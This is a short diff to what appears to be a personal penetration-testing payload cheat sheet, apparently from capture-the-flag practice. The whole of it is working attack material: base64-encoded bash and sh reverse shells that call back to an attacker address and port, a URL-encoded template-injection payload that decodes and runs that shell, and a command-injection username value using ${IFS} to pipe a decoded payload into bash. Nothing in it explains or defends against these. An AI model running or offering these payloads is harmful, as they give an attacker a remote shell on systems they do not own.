@@ -1,2 +1,6 @@
 base64 <<< "bash -i >& /dev/tcp/10.10.14.127/1234 0>&1" | sed 's/\+/\%2b/'
 category1=a%0A<%25%3dsystem("echo+YmFzaCAtaSA%2bJiAvZGV2L3RjcC8xMC4xMC4xNC4xMjcvMTIzNCAwPiYxCg==+|+base64+-d+|+bash");%25>
+
+
+echo '/bin/sh -i >& /dev/tcp/$KaliIP/$Port 0>&1' | base64
+username=user;echo${IFS}'Yourencodedpayload'|base64${IFS}-d|bash;
